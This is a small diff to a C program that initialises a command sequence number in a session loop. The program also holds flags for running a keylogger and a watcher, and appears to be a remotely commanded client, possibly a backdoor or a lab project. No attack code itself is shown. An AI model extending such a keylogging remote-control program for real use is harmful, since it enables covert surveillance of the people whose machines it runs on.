@@ -178,6 +178,7 @@ int main(const int argc, char * argv[]) {
         session_info.run_keylogger = false;
         session_info.run_watcher = false;
         session_info.last_command_code = UNKNOWN;
+        session_info.last_command_sequence_number = 0;
 
         while (connection_loop) {
             memset(buffer, 0, sizeof(buffer));
